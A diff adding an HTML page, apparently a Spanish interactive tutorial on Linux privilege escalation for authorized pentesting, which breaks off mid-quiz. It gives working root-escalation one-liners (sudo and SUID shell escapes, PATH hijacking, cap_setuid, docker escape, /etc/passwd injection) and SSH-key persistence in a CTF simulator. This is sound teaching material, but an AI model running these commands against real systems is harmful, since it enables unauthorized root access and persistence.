@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Escalamiento de Privilegios en Kali Linux — Guía Interactiva</title>
+  <meta name="description" content="Guía interactiva completa para aprender, entender y practicar el escalamiento de privilegios en Kali Linux. Incluye simulador CTF, quiz y cheatsheets.">
+  <style>
+    :root {
+      --bg: #0f0f0f;
+      --surface: #1a1a1a;
+      --surface-2: #242424;
+      --border: #333;
+      --text-primary: #f5f5f5;
+      --text-secondary: #a0a0a0;
+      --text-tertiary: #666;
+      --accent: #00d4aa;
+      --accent-dim: rgba(0, 212, 170, 0.12);
+      --danger: #ff6b6b;
+      --danger-dim: rgba(255, 107, 107, 0.12);
+      --warning: #f5a623;
+      --warning-dim: rgba(245, 166, 35, 0.12);
+      --positive: #00d4aa;
+      --positive-dim: rgba(0, 212, 170, 0.12);
+      --chart-1: #4dabf7;
+      --chart-2: #ff6b6b;
+      --chart-3: #51cf66;
+      --chart-4: #be4bdb;
+      --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      --font-mono: "SF Mono", "Fira Code", "Cascadia Code", Consolas, monospace;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: var(--font-sans);
+      background: var(--bg);
+      color: var(--text-primary);
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+    .container { max-width: 800px; margin: 0 auto; padding: 24px 16px; }
+
+    /* Header */
+    .header { text-align: center; margin-bottom: 28px; padding: 24px 0; border-bottom: 1px solid var(--border); }
+    .header h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; }
+    .header p { margin-top: 8px; color: var(--text-secondary); font-size: 14px; }
+    .header .badge-row { margin-top: 12px; display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; }
+    .badge {
+      display: inline-flex; align-items: center; gap: 4px;
+      padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 700;
+      border: 1px solid var(--border);
+    }
+    .badge-green { background: var(--positive-dim); color: var(--positive); border-color: rgba(0,212,170,0.3); }
+    .badge-orange { background: var(--warning-dim); color: var(--warning); border-color: rgba(245,166,35,0.3); }
+    .badge-red { background: var(--danger-dim); color: var(--danger); border-color: rgba(255,107,107,0.3); }
+    .badge-blue { background: rgba(77,171,247,0.12); color: var(--chart-1); border-color: rgba(77,171,247,0.3); }
+
+    /* Tabs */
+    .tabs { display: flex; gap: 4px; border-bottom: 1px solid var(--border); margin-bottom: 20px; overflow-x: auto; scrollbar-width: none; }
+    .tabs::-webkit-scrollbar { display: none; }
+    .tab {
+      padding: 10px 16px; font-size: 13px; font-weight: 600; cursor: pointer;
+      border: none; background: transparent; color: var(--text-tertiary);
+      white-space: nowrap; border-bottom: 2px solid transparent;
+      transition: all 0.15s; font-family: inherit;
+    }
+    .tab:hover { color: var(--text-secondary); }
+    .tab.active { color: var(--text-primary); border-bottom-color: var(--accent); }
+
+    /* Panels */
+    .panel { display: none; animation: fadeIn 0.25s ease; }
+    .panel.active { display: block; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* Cards */
+    .card {
+      border: 1px solid var(--border); border-radius: 12px; padding: 18px;
+      margin-bottom: 12px; background: var(--surface);
+    }
+    .card-title { font-weight: 700; font-size: 15px; margin-bottom: 8px; display: flex; align-items: center; gap: 10px; }
+    .card-desc { font-size: 14px; color: var(--text-secondary); line-height: 1.6; }
+    .card code {
+      font-family: var(--font-mono); background: var(--surface-2);
+      padding: 2px 6px; border-radius: 4px; font-size: 12px; color: var(--accent);
+    }
+
+    /* Grid */
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    @media (max-width: 600px) { .grid-2 { grid-template-columns: 1fr; } }
+
+    /* Terminal */
+    .terminal {
+      background: #080808; border-radius: 10px; padding: 16px;
+      font-family: var(--font-mono); font-size: 12.5px; line-height: 1.7;
+      overflow-x: auto; margin: 12px 0; border: 1px solid #1a1a1a;
+    }
+    .terminal .cmd { color: #e0e0e0; }
+    .terminal .out { color: #888; }
+    .terminal .root { color: var(--danger); font-weight: 600; }
+    .terminal .comment { color: #555; font-style: italic; }
+
+    /* Accordion */
+    .accordion { border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin-bottom: 10px; background: var(--surface); }
+    .acc-header {
+      padding: 14px 16px; cursor: pointer; display: flex; justify-content: space-between;
+      align-items: center; font-weight: 600; font-size: 13.5px; background: transparent;
+      transition: background 0.15s; user-select: none;
+    }
+    .acc-header:hover { background: var(--surface-2); }
+    .acc-body { max-height: 0; overflow: hidden; transition: max-height 0.35s ease; padding: 0 16px; }
+    .acc-body.open { max-height: 800px; padding: 0 16px 16px; }
+    .acc-icon { transition: transform 0.25s; color: var(--text-tertiary); font-size: 11px; }
+    .acc-header.open .acc-icon { transform: rotate(180deg); }
+
+    /* Buttons */
+    .btn {
+      padding: 10px 18px; border-radius: 8px; border: 1px solid var(--border);
+      background: var(--surface-2); color: var(--text-primary); font-size: 13px;
+      font-weight: 600; cursor: pointer; transition: all 0.15s; font-family: inherit;
+    }
+    .btn:hover { background: var(--border); }
+    .btn-primary { background: var(--accent); color: #000; border-color: var(--accent); }
+    .btn-primary:hover { opacity: 0.85; background: var(--accent); }
+    .btn-block { display: block; width: 100%; text-align: left; margin-bottom: 8px; }
+
+    /* Quiz */
+    .quiz-option {
+      display: block; width: 100%; text-align: left; padding: 12px 16px;
+      margin-bottom: 8px; border: 1px solid var(--border); border-radius: 8px;
+      background: var(--surface); cursor: pointer; font-size: 13.5px;
+      transition: all 0.15s; color: var(--text-primary); font-family: inherit;
+    }
+    .quiz-option:hover { border-color: var(--accent); background: var(--surface-2); }
+    .quiz-option.correct { border-color: var(--positive); background: var(--positive-dim); }
+    .quiz-option.wrong { border-color: var(--danger); background: var(--danger-dim); }
+    .quiz-option:disabled { cursor: not-allowed; opacity: 0.7; }
+
+    /* Progress */
+    .progress { display: flex; gap: 4px; margin-bottom: 16px; }
+    .progress-step { flex: 1; height: 4px; border-radius: 2px; background: var(--border); transition: background 0.3s; }
+    .progress-step.done { background: var(--accent); }
+
+    /* Checklist */
+    .checklist-item { display: flex; align-items: center; gap: 12px; padding: 10px 0; font-size: 14px; cursor: pointer; border-bottom: 1px solid var(--border); }
+    .checklist-item:last-child { border-bottom: none; }
+    .checklist-item input { width: 18px; height: 18px; accent-color: var(--accent); cursor: pointer; }
+    .checklist-item.checked { text-decoration: line-through; color: var(--text-tertiary); }
+
+    /* Lists */
+    .num-list { list-style: none; padding: 0; }
+    .num-list li { padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 14px; display: flex; align-items: flex-start; gap: 10px; }
+    .num-list li:last-child { border-bottom: none; }
+    .num-list .num { font-family: var(--font-mono); font-variant-numeric: tabular-nums; color: var(--text-tertiary); min-width: 24px; font-weight: 600; }
+
+    /* Tags */
+    .tag { display: inline-flex; align-items: center; gap: 4px; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: 600; margin-right: 4px; margin-bottom: 4px; border: 1px solid var(--border); }
+
+    /* Footer */
+    .footer { text-align: center; margin-top: 32px; padding-top: 20px; border-top: 1px solid var(--border); color: var(--text-tertiary); font-size: 12px; }
+    .footer a { color: var(--accent); text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 8px; height: 8px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #444; }
+
+    /* Result card */
+    .result-card { text-align: center; padding: 32px; }
+    .result-emoji { font-size: 48px; margin-bottom: 12px; }
+    .result-title { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+
+    /* Warning box */
+    .warning-box { border: 1px solid rgba(255,107,107,0.3); background: var(--danger-dim); border-radius: 10px; padding: 14px; font-size: 13px; color: var(--danger); }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🐉 Escalamiento de Privilegios en Kali Linux</h1>
+      <p>Guía interactiva completa — desde enumeración hasta root</p>
+      <div class="badge-row">
+        <span class="badge badge-green">✓ Educativo</span>
+        <span class="badge badge-orange">⚡ Pentesting</span>
+        <span class="badge badge-blue">🎮 CTF Simulador</span>
+        <span class="badge badge-red">⚠️ Solo uso autorizado</span>
+      </div>
+    </div>
+
+    <div class="tabs">
+      <button class="tab active" onclick="switchTab('basics')">Fundamentos</button>
+      <button class="tab" onclick="switchTab('enum')">Enumeración</button>
+      <button class="tab" onclick="switchTab('techniques')">Técnicas</button>
+      <button class="tab" onclick="switchTab('tools')">Herramientas</button>
+      <button class="tab" onclick="switchTab('ctf')">Simulador CTF</button>
+      <button class="tab" onclick="switchTab('quiz')">Quiz</button>
+      <button class="tab" onclick="switchTab('cheatsheet')">Cheatsheet</button>
+    </div>
+
+    <!-- FUNDAMENTOS -->
+    <div id="basics" class="panel active">
+      <div class="card">
+        <div class="card-title">💡 ¿Qué es el Escalamiento de Privilegios?</div>
+        <div class="card-desc">
+          Es la fase de <strong>post-explotación</strong> donde elevas tus permisos en un sistema comprometido, pasando de usuario limitado a <code>root</code> (Linux) o <code>SYSTEM</code> (Windows). Es una técnica legítima en <strong>pentesting autorizado</strong> para evaluar la profundidad de una brecha.
+        </div>
+      </div>
+
+      <div class="grid-2">
+        <div class="card">
+          <div class="card-title">↗️ Vertical</div>
+          <div class="card-desc">De usuario normal a administrador/root. Es el objetivo más común en pentesting.</div>
+          <span class="tag" style="background:var(--positive-dim);color:var(--positive);border-color:rgba(0,212,170,0.3)">Común</span>
+        </div>
+        <div class="card">
+          <div class="card-title">↔️ Horizontal</div>
+          <div class="card-desc">De un usuario a otro con el mismo nivel de privilegios. Útil para pivotar entre cuentas.</div>
+          <span class="tag" style="background:var(--warning-dim);color:var(--warning);border-color:rgba(245,166,35,0.3)">Táctico</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">📋 Flujo de Trabajo Típico</div>
+        <ul class="num-list">
+          <li><span class="num">1</span> Compromiso inicial (shell como usuario limitado)</li>
+          <li><span class="num">2</span> Enumeración del sistema y del entorno</li>
+          <li><span class="num">3</span> Identificación de vectores de escalamiento</li>
+          <li><span class="num">4</span> Explotación del vector identificado</li>
+          <li><span class="num">5</span> Estabilización y persistencia (si aplica)</li>
+        </ul>
+      </div>
+
+      <div class="warning-box">
+        <strong>⚠️ Disclaimer Ético:</strong> Todo el contenido de esta guía es exclusivamente para fines educativos y pentesting autorizado. El acceso no autorizado a sistemas informáticos es un delito en la mayoría de las jurisdicciones. Practica solo en laboratorios propios, CTFs, o con permiso explícito por escrito.
+      </div>
+    </div>
+
+    <!-- ENUMERACIÓN -->
+    <div id="enum" class="panel">
+      <div class="card">
+        <div class="card-title">🔍 Enumeración del Sistema</div>
+        <div class="card-desc">La enumeración es el 90% del escalamiento. Sin información, no hay exploit.</div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>🖥️ Información del Sistema y Kernel</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">$ uname -a</span>
+<span class="out">Linux target 5.15.0-105-generic #115-Ubuntu SMP ... x86_64 GNU/Linux</span>
+<span class="cmd">$ cat /etc/os-release</span>
+<span class="out">PRETTY_NAME="Ubuntu 22.04.4 LTS"</span>
+<span class="cmd">$ hostnamectl</span>
+<span class="cmd">$ dpkg -l | grep linux-image</span>
+<span class="comment"># Busca versiones antiguas del kernel. Usa searchsploit o linux-exploit-suggester</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>👤 Usuarios, Grupos y Permisos</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">$ id && whoami && groups</span>
+<span class="cmd">$ cat /etc/passwd | grep -v nologin | grep -v false</span>
+<span class="cmd">$ sudo -l</span>
+<span class="out">User www-data may run the following commands on target:
+    (root) NOPASSWD: /usr/bin/python3</span>
+          </div>
+          <div class="card-desc" style="margin-top:10px"><code>sudo -l</code> es CRÍTICO. Si ves <code>NOPASSWD</code>, verifica en <a href="https://gtfobins.github.io" target="_blank" style="color:var(--accent)">GTFOBins</a> cómo escalar.</div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>⚙️ Procesos, Servicios y Cron</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">$ ps aux</span>
+<span class="cmd">$ ps -ef | grep root</span>
+<span class="cmd">$ systemctl list-units --type=service</span>
+<span class="cmd">$ crontab -l</span>
+<span class="cmd">$ cat /etc/crontab && ls -la /etc/cron.*</span>
+<span class="cmd">$ find /etc/cron* -type f -perm -o+w 2>/dev/null</span>
+<span class="comment"># Busca cron jobs como root con scripts editables por ti</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>🔐 Archivos SUID, SGID y Sticky</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">$ find / -perm -4000 -type f 2>/dev/null</span>
+<span class="cmd">$ find / -perm -2000 -type f 2>/dev/null</span>
+<span class="cmd">$ find / -perm -2 -type f 2>/dev/null</span>
+<span class="cmd">$ find / -writable -type d 2>/dev/null | grep -v proc</span>
+          </div>
+          <div class="card-desc" style="margin-top:10px">Archivos SUID ejecutan con permisos del propietario. Si es root, puedes escalar. Verifica en GTFOBins.</div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>🌐 Red, Variables de Entorno y Capacidades</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">$ ip a && netstat -tulpn 2>/dev/null || ss -tulpn</span>
+<span class="cmd">$ env | grep -i path</span>
+<span class="cmd">$ getcap -r / 2>/dev/null</span>
+<span class="out">/usr/bin/python3 = cap_setuid+ep</span>
+          </div>
+          <div class="card-desc" style="margin-top:10px">Las <code>capabilities</code> son permisos granulares. <code>cap_setuid</code> permite cambiar el UID — vector de escalamiento directo.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TÉCNICAS -->
+    <div id="techniques" class="panel">
+      <div class="card">
+        <div class="card-title">🎯 Técnicas Principales de Escalamiento</div>
+        <div class="card-desc">Selecciona una técnica para ver el exploit paso a paso.</div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>1️⃣ Sudo Abuse / GTFOBins</span>
+          <span class="badge badge-green" style="margin-left:auto;margin-right:10px">Fácil</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="card-desc">Si <code>sudo -l</code> muestra que puedes ejecutar un binario como root sin contraseña:</div>
+          <div class="terminal">
+<span class="cmd">$ sudo -l</span>
+<span class="out">(root) NOPASSWD: /usr/bin/find</span>
+<span class="cmd">$ sudo find . -exec /bin/sh \; -quit</span>
+<span class="root"># whoami</span>
+<span class="out">root</span>
+          </div>
+          <div class="card-desc" style="margin-top:10px">Otros comunes: <code>vim</code>, <code>less</code>, <code>python3</code>, <code>bash</code>, <code>awk</code>, <code>nano</code>. Consulta GTFOBins para cada uno.</div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>2️⃣ SUID Binaries</span>
+          <span class="badge badge-orange" style="margin-left:auto;margin-right:10px">Medio</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="card-desc">Binarios con bit SUID que ejecutan como root:</div>
+          <div class="terminal">
+<span class="cmd">$ ls -la /usr/bin/find</span>
+<span class="out">-rwsr-xr-x 1 root root ... /usr/bin/find</span>
+<span class="cmd">$ /usr/bin/find . -exec /bin/sh -p \; -quit</span>
+<span class="root"># id</span>
+<span class="out">uid=0(root) gid=0(root)</span>
+          </div>
+          <div class="card-desc" style="margin-top:10px">El flag <code>-p</code> preserva los permisos efectivos del SUID.</div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>3️⃣ Kernel Exploits</span>
+          <span class="badge badge-red" style="margin-left:auto;margin-right:10px">Avanzado</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="card-desc">Cuando el kernel es antiguo y tiene CVEs conocidas:</div>
+          <div class="terminal">
+<span class="cmd">$ uname -r</span>
+<span class="out">5.15.0-50-generic</span>
+<span class="cmd">$ searchsploit linux kernel 5.15</span>
+<span class="cmd">$ linux-exploit-suggester</span>
+<span class="cmd">$ wget [exploit.c] -O exploit.c</span>
+<span class="cmd">$ gcc exploit.c -o exploit</span>
+<span class="cmd">$ ./exploit</span>
+<span class="root"># whoami</span>
+<span class="out">root</span>
+          </div>
+          <div class="card-desc" style="margin-top:10px">⚠️ Compilar en el target puede fallar. Trae binarios precompilados o compila estáticamente: <code>gcc -static</code>.</div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>4️⃣ PATH Hijacking</span>
+          <span class="badge badge-orange" style="margin-left:auto;margin-right:10px">Medio</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="card-desc">Si un script root ejecuta un comando sin ruta absoluta:</div>
+          <div class="terminal">
+<span class="cmd">$ cat /usr/local/bin/backup.sh</span>
+<span class="out">#!/bin/bash
+cd /home/user
+tar czf /backups/user.tar.gz *</span>
+<span class="cmd">$ echo '/bin/bash' > /tmp/tar</span>
+<span class="cmd">$ chmod +x /tmp/tar</span>
+<span class="cmd">$ export PATH=/tmp:$PATH</span>
+<span class="cmd">$ /usr/local/bin/backup.sh</span>
+<span class="root"># whoami</span>
+<span class="out">root</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>5️⃣ Capabilities (cap_setuid)</span>
+          <span class="badge badge-orange" style="margin-left:auto;margin-right:10px">Medio</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">$ getcap /usr/bin/python3</span>
+<span class="out">/usr/bin/python3 = cap_setuid+ep</span>
+<span class="cmd">$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span>
+<span class="root"># id</span>
+<span class="out">uid=0(root)</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>6️⃣ Docker / LXC Escape</span>
+          <span class="badge badge-red" style="margin-left:auto;margin-right:10px">Avanzado</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">$ id</span>
+<span class="out">uid=1000(user) gid=999(docker)</span>
+<span class="cmd">$ docker run -v /:/mnt -it alpine chroot /mnt sh</span>
+<span class="root"># whoami</span>
+<span class="out">root</span>
+          </div>
+          <div class="card-desc" style="margin-top:10px">Pertenecer al grupo <code>docker</code> es equivalente a root. También busca sockets accesibles: <code>/var/run/docker.sock</code>.</div>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="acc-header" onclick="toggleAcc(this)">
+          <span>7️⃣ Writable /etc/passwd o /etc/sudoers</span>
+          <span class="badge badge-green" style="margin-left:auto;margin-right:10px">Fácil</span>
+          <span class="acc-icon">▼</span>
+        </div>
+        <div class="acc-body">
+          <div class="terminal">
+<span class="cmd">$ openssl passwd -1 hacker</span>
+<span class="out">$1$xyz$abc123...</span>
+<span class="cmd">$ echo 'hacker:$1$xyz$abc123...:0:0::/root:/bin/bash' >> /etc/passwd</span>
+<span class="cmd">$ su hacker</span>
+<span class="root"># whoami</span>
+<span class="out">root</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- HERRAMIENTAS -->
+    <div id="tools" class="panel">
+      <div class="card">
+        <div class="card-title">🛠️ Arsenal de Herramientas</div>
+        <div class="card-desc">Marca las que ya dominas. Las esenciales vienen preinstaladas en Kali.</div>
+      </div>
+
+      <div class="card">
+        <div style="font-weight:700; font-size:14px; margin-bottom:12px;">📜 Scripts de Enumeración Automática</div>
+        <label class="checklist-item"><input type="checkbox" onchange="this.parentElement.classList.toggle('checked')"><span><strong>LinPEAS</strong> — El más completo. Enumera TODO.</span></label>
+        <label class="checklist-item"><input type="checkbox" onchange="this.parentElement.classList.toggle('checked')"><span><strong>LinEnum</strong> — Alternativa ligera y rápida.</span></label>
+        <label class="checklist-item"><input type="checkbox" onchange="this.parentElement.classList.toggle('checked')"><span><strong>linux-exploit-suggester</strong> — Sugiere exploits para el kernel.</span></label>
+        <label class="checklist-item"><input type="checkbox" onchange="this.parentElement.classList.toggle('checked')"><span><strong>unix-privesc-check</strong> — Script en bash, sin dependencias.</span></label>
+      </div>
+
+      <div class="card">
+        <div style="font-weight:700; font-size:14px; margin-bottom:12px;">📚 Bases de Datos y Referencias</div>
+        <label class="checklist-item"><input type="checkbox" onchange="this.parentElement.classList.toggle('checked')"><span><strong>GTFOBins</strong> — Binarios SUID/sudo abusables.</span></label>
+        <label class="checklist-item"><input type="checkbox" onchange="this.parentElement.classList.toggle('checked')"><span><strong>Exploit-DB / searchsploit</strong> — Búsqueda local de exploits.</span></label>
+        <label class="checklist-item"><input type="checkbox" onchange="this.parentElement.classList.toggle('checked')"><span><strong>PayloadsAllTheThings</strong> — Cheatsheets de todo tipo.</span></label>
+      </div>
+
+      <div class="card">
+        <div style="font-weight:700; font-size:14px; margin-bottom:12px;">💻 Comandos Nativos Esenciales</div>
+        <div class="terminal">
+<span class="cmd">$ find / -perm -4000 -type f 2>/dev/null</span>
+<span class="cmd">$ sudo -l</span>
+<span class="cmd">$ getcap -r / 2>/dev/null</span>
+<span class="cmd">$ ps aux --forest</span>
+<span class="cmd">$ netstat -tulpn 2>/dev/null || ss -tulpn</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SIMULADOR CTF -->
+    <div id="ctf" class="panel">
+      <div class="card">
+        <div class="card-title">🎮 Simulador: Escena del Crimen</div>
+        <div class="card-desc">Tienes una shell como <code>www-data</code>. Analiza la evidencia y escoge el vector correcto para llegar a root.</div>
+      </div>
+
+      <div id="ctf-stage-0">
+        <div class="progress">
+          <div class="progress-step done"></div>
+          <div class="progress-step"></div>
+          <div class="progress-step"></div>
+          <div class="progress-step"></div>
+        </div>
+        <div class="card">
+          <div class="card-title">🔍 Paso 1: Reconocimiento</div>
+          <div class="terminal">
+<span class="cmd">$ whoami</span>
+<span class="out">www-data</span>
+<span class="cmd">$ sudo -l</span>
+<span class="out">Matching Defaults entries for www-data on target:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User www-data may run the following commands on target:
+    (root) NOPASSWD: /usr/bin/awk</span>
+          </div>
+          <div class="card-desc" style="margin-top:12px"><strong>¿Qué haces ahora?</strong></div>
+          <button class="quiz-option btn-block" onclick="ctfNext(1, false, this)">Compilar un exploit de kernel</button>
+          <button class="quiz-option btn-block" onclick="ctfNext(1, true, this)">Buscar awk en GTFOBins y ejecutar sudo awk 'BEGIN {system("/bin/bash")}'</button>
+          <button class="quiz-option btn-block" onclick="ctfNext(1, false, this)">Editar /etc/passwd directamente</button>
+          <button class="quiz-option btn-block" onclick="ctfNext(1, false, this)">Hacer PATH hijacking</button>
+        </div>
+      </div>
+
+      <div id="ctf-stage-1" style="display:none">
+        <div class="progress">
+          <div class="progress-step done"></div>
+          <div class="progress-step done"></div>
+          <div class="progress-step"></div>
+          <div class="progress-step"></div>
+        </div>
+        <div class="card">
+          <div class="card-title">✅ ¡Correcto! Shell como root</div>
+          <div class="terminal">
+<span class="cmd">$ sudo awk 'BEGIN {system("/bin/bash")}'</span>
+<span class="root"># whoami</span>
+<span class="out">root</span>
+<span class="root"># cat /root/flag.txt</span>
+<span class="out">CTF{sudo_gtfobins_master}</span>
+          </div>
+          <div class="card-desc" style="margin-top:12px"><strong>Ahora busca persistencia. ¿Qué técnica es más sigilosa?</strong></div>
+          <button class="quiz-option btn-block" onclick="ctfNext(2, false, this)">Crear un usuario nuevo en /etc/passwd</button>
+          <button class="quiz-option btn-block" onclick="ctfNext(2, true, this)">Agregar una clave SSH pública a /root/.ssh/authorized_keys</button>
+          <button class="quiz-option btn-block" onclick="ctfNext(2, false, this)">Modificar /etc/sudoers con visudo</button>
+          <button class="quiz-option btn-block" onclick="ctfNext(2, false, this)">Instalar un rootkit</button>
+        </div>
+      </div>
+
+      <div id="ctf-stage-2" style="display:none">
+        <div class="progress">
+          <div class="progress-step done"></div>
+          <div class="progress-step done"></div>
+          <div class="progress-step done"></div>
+          <div class="progress-step"></div>
+        </div>
+        <div class="card">
+          <div class="card-title">✅ Persistencia establecida</div>
+          <div class="terminal">
+<span class="root"># mkdir -p /root/.ssh && echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys</span>
+<span class="root"># chmod 600 /root/.ssh/authorized_keys</span>
+          </div>
+          <div class="card-desc" style="margin-top:12px"><strong>Ahora limpia tus huellas. ¿Qué archivo de logs NO deberías tocar para no levantar sospechas?</strong></div>
+          <button class="quiz-option btn-block" onclick="ctfNext(3, false, this)">/var/log/auth.log</button>
+          <button class="quiz-option btn-block" onclick="ctfNext(3, false, this)">/var/log/syslog</button>
+          <button class="quiz-option btn-block" onclick="ctfNext(3, true, this)">Ninguno: borrar logs genera más alertas que dejarlos</button>
+          <button class="quiz-option btn-block" onclick="ctfNext(3, false, this)">/var/log/apache2/access.log</button>
+        </div>
+      </div>
+
+      <div id="ctf-stage-3" style="display:none">
+        <div class="progress">
+          <div class="progress-step done"></div>
+          <div class="progress-step done"></div>
+          <div class="progress-step done"></div>
+          <div class="progress-step done"></div>
+        </div>
+        <div class="card result-card">
+          <div class="result-emoji">🏆</div>
+          <div class="result-title">¡Misión Completada!</div>
+          <div class="card-desc">Has escalado privilegios, establecido persistencia y tomado la decisión correcta sobre los logs. Eres un pentester con criterio.</div>
+          <div style="margin-top:16px">
+            <span class="badge badge-blue">CTF Completado</span>
+          </div>
+          <button class="btn btn-primary" style="margin-top:16px" onclick="resetCTF()">🔄 Reiniciar Simulador</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- QUIZ -->
+    <div id="quiz" class="panel">
+      <div class="card">
+        <div class="card-title">🧠 Quiz Rápido</div>
+        <div class="card-desc">5 preguntas para validar tu conocimiento.</div>
+      </div>
+
+      <div id="quiz-container">
+        <div class="card" id="q1">
+          <div style="font-weight:700; font-size:14px; margin-bottom:12px;">1. ¿Qué comando muestra qué binarios puedes ejecutar como root con sudo?</div>
+          <button class="quiz-option btn-block" onclick="answerQuiz(1, 'a', false, this)">A. sudo -i</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(1, 'b', true, this)">B. sudo -l</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(1, 'c', false, this)">C. sudo -u root</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(1, 'd', false, this)">D. sudo --list-privs</button>
+        </div>
+
+        <div class="card" id="q2" style="opacity:0.35; pointer-events:none;">
+          <div style="font-weight:700; font-size:14px; margin-bottom:12px;">2. ¿Qué bit de permiso permite que un binario se ejecute con los privilegios del propietario?</div>
+          <button class="quiz-option btn-block" onclick="answerQuiz(2, 'a', false, this)">A. SGID (2000)</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(2, 'b', true, this)">B. SUID (4000)</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(2, 'c', false, this)">C. Sticky (1000)</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(2, 'd', false, this)">D. EXEC (0100)</button>
+        </div>
+
+        <div class="card" id="q3" style="opacity:0.35; pointer-events:none;">
+          <div style="font-weight:700; font-size:14px; margin-bottom:12px;">3. ¿Qué capability permite cambiar el UID de un proceso?</div>
+          <button class="quiz-option btn-block" onclick="answerQuiz(3, 'a', true, this)">A. cap_setuid</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(3, 'b', false, this)">B. cap_sys_admin</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(3, 'c', false, this)">C. cap_net_raw</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(3, 'd', false, this)">D. cap_dac_override</button>
+        </div>
+
+        <div class="card" id="q4" style="opacity:0.35; pointer-events:none;">
+          <div style="font-weight:700; font-size:14px; margin-bottom:12px;">4. ¿Cuál es la mejor práctica al encontrar un kernel vulnerable?</div>
+          <button class="quiz-option btn-block" onclick="answerQuiz(4, 'a', false, this)">A. Ejecutar el primer exploit que encuentres en Google</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(4, 'b', false, this)">B. Reiniciar el sistema para aplicar parches</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(4, 'c', true, this)">C. Verificar la arquitectura, compilar estáticamente y probar en un entorno seguro primero</button>
+          <button class="quiz-option btn-block" onclick="answerQuiz(4, 'd', false, this)">D. Usar Metasploit siempre, sin verificar</button>
+        </div>
+
+        <div class="card" id="q5" style="opacity:0.35; pointer-events:none;">
+          <div style="font-weight:700; font-size:14px; margin-bottom:12px;">5. Si un script de root ejecuta <code>tar</code> sin ruta absoluta, ¿qué técnica aplicas?</div>
